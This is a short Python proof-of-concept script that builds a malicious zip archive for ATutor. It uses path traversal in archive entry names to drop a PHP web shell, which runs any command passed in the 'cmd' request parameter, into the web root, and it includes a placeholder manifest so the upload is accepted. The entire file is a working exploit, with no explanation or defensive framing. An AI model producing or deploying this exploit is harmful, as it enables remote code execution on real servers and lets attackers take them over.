#!/usr/bin/python
import zipfile
from cStringIO import StringIO

def _build_zip():
    f = StringIO()
    z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
    # z.writestr('../../../../../var/www/html/ATutor/mods/pwn/poc.php5', '<?php phpinfo(); ?>')
    z.writestr('../../../../../var/www/html/ATutor/mods/pwn/cmd.php5', '<?php system($_REQUEST["cmd"]); ?>')
    z.writestr('imsmanifest.xml', 'loldongs')
    z.close()
    zip = open('poc.zip','wb')
    zip.write(f.getvalue())
    zip.close()

_build_zip()
